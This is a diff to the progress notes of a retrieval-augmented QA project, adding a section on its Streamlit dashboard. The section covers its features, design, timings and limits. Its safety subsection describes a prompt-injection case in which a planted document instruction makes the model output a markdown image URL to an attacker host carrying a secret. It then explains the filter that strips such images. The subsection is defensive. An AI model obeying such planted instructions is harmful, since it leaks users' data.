@@ -4,7 +4,7 @@ Three steps from the brief: (1) a FastAPI service, (2) a query dashboard, (3) Do
 
 ---
 
-## Step 1 (2026-09-28): the FastAPI service
+## Step 1 (2026-09-27): the FastAPI service
 
 **Code:** `hyrag/api.py`. **Run:** `uvicorn hyrag.api:app --port 8000`; the OpenAPI docs are at `/docs` and `/openapi.json`. **Tests:** `tests/test_api.py`: 20 in-process tests with a real index, retriever and document store, and fake models.
 
@@ -54,3 +54,61 @@ Three steps from the brief: (1) a FastAPI service, (2) a query dashboard, (3) Do
 - **One process:** the answer cache and the ingest lock live in memory. Several server processes would need a shared cache (e.g. Redis) and ingestion moved to one worker or a queue.
 - **Deletion is not exposed** over HTTP (`Pipeline.delete` exists). It should come with the same admin auth when needed.
 - **Throughput is bounded by the Groq plan**, not the server: ~115 fully checked questions/day (docs/phase3-audit.md).
+
+---
+
+## Step 2 (2026-09-27): the query dashboard
+
+**Code:** `dashboard/app.py` (page), `dashboard/client.py` (HTTP client), `dashboard/safety.py` (rendering filter). **Run:** `HYRAG_API_URL=http://localhost:8000 streamlit run dashboard/app.py`. **Tests:** `tests/test_dashboard.py` (7 click-through tests: Streamlit's AppTest drives the real page against a real uvicorn server with a real index and fake models) and `tests/test_dashboard_safety.py` (6). **Speed:** `scripts/measure_dashboard.py`.
+
+### What it shows (the brief's four items)
+- **The answer with clickable citations:** each `[n]` is a link to that source's heading below the answer (document, section path, page, and the cited passage in an expander).
+- **Retrieved chunks ranked by relevance:** a table (relevance, reranker score, meaning-search rank, keyword rank) plus each passage's text.
+- **Confidence by dimension:** overall score and level, then retrieval, citations verified and completeness, and which caps applied.
+- **Hybrid vs dense-only:** a checkbox runs the same question in both modes side by side. Each column's citations link only to its own sources (`#hybrid-source-1` vs `#dense-source-1`).
+
+The honest statuses (partial, unverified, unchecked, not found, error) each get their own banner. "Not found" shows the closest documents instead of an answer.
+
+### Design decisions
+- **A thin client of the API, not a second copy of the pipeline.** The dashboard never imports `hyrag`; it talks HTTP only. It therefore runs in its own small container (no PyTorch, no index), always shows exactly what the API returns, and could be replaced by a React app without touching HyRAG.
+- **Streamlit, chosen after measuring whether it is fast enough** (the concern: Streamlit reruns the whole script on every interaction). Three things stop reruns from costing anything:
+  - the question lives in a form, so typing never reruns the page;
+  - answers are kept in `session_state`, so any later rerun redraws from memory and makes no API call (a test enforces this);
+  - the side panel's status and document list are cached (30 s / 60 s).
+
+  Compare mode sends both requests in parallel (one wait, not two).
+- **The client waits 75 s; the server's budget is 60 s.** The server, not the client, decides when a question took too long, and says so in a structured answer.
+- **Errors are explained, not crashed on:** API unreachable, wrong key (401), a question that is too long (422) and a proxy error page (non-JSON 5xx) each get a clear message (tested with the API down).
+
+### Safety: model text is untrusted
+A document can carry a planted instruction that makes the model write `![](https://attacker.example/?q=<secret>)`. The browser fetches images as soon as they render, so data would leak without anyone clicking. `safe_markdown` therefore does three things before any model text is shown:
+- removes inline images, reference-style images and link definitions;
+- shows outbound links as plain text;
+- turns only the `[n]` citations into links, and those links stay on the page.
+
+Raw HTML is never enabled. Checked in a real browser on a live answer: 0 images and no outbound links inside answers.
+
+### Measured speed
+With fake, instant models, so only the dashboard and HTTP are timed (medians over 5 runs; AppTest adds its own overhead, so these are upper bounds):
+
+| What | Time |
+|---|---|
+| First load (status + document list) | 467 ms |
+| Press Ask → answer on screen | 42 ms |
+| Redraw with an answer on screen | 25 ms, 0 API calls |
+| Compare mode (2 requests in parallel) | 44 ms |
+
+**Live (real Mistral, Groq, reranker):** a compared question took 5.7 s at the API for each mode, run in parallel. The dashboard adds about 30–45 ms to that, so the time a user waits is the models', not Streamlit's.
+
+### Real-browser check
+Against the real stack in Chrome, with compare mode on:
+- the page loaded, and the sidebar showed "API ready · 1,266 chunks";
+- both answers came back as "Answered" with medium confidence;
+- clicking `[1]` scrolled to "[1] vpn-setup.md › VPN Setup Guide > Troubleshooting > Error ERR_TUNNEL_4012" and set the URL to `#hybrid-source-1`;
+- every in-page link resolved to an existing heading;
+- the server logs showed no errors.
+
+### Known limits
+- **Not built for many concurrent users.** Streamlit keeps one Python session per browser tab. That is fine for an internal tool or a demo; a public, high-traffic front end would be a static React app calling the same API.
+- **No sign-in.** If the API requires `HYRAG_API_KEY`, the dashboard holds it server-side (from its environment) and every visitor uses it. Anyone who can open the page can ask questions, so put it behind the company's SSO proxy.
+- **No streaming.** The answer appears once it has been checked, which is intentional: an answer that was still being verified would be shown before it had passed.
